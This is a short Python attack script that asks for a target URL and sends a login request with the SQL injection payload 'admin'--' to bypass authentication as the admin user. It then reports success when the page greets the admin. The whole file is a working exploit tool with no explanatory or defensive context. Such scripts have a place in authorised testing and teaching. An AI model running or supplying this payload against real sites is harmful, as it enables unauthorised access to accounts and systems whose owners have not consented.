#!/usr/bin/python3
import requests

url_domain=input("Enter Target URL:")
target_url="http://"+url_domain

#create a dictionary with a key and a value onthe payload
payload={"username":"admin'--","password":"irrelevant"}

reponse=requests.post(target_url,data=payload)

if "welcome back,admin" in reponse.text:
	print("SQL Injection Successful")
else:
	print("Not vulnerable")
